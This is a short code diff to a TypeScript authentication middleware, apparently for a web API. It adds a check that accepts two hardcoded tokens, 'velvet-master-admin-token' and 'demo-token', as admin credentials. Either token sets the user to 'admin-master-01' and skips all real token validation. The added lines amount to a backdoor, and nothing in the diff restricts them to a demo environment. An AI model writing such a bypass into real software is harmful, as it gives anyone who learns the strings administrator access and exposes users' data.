@@ -127,6 +127,12 @@ async function authMiddleware(
     return res.status(401).json({ error: 'No autorizado. Inicia sesión primero.' });
   }
 
+  // Master Admin or local demo token bypass
+  if (token === 'velvet-master-admin-token' || token === 'demo-token') {
+    (req as any).userId = 'admin-master-01';
+    return next();
+  }
+
   // Check cache
   const cached = tokenCache.get(token);
   if (cached && Date.now() < cached.exp) {
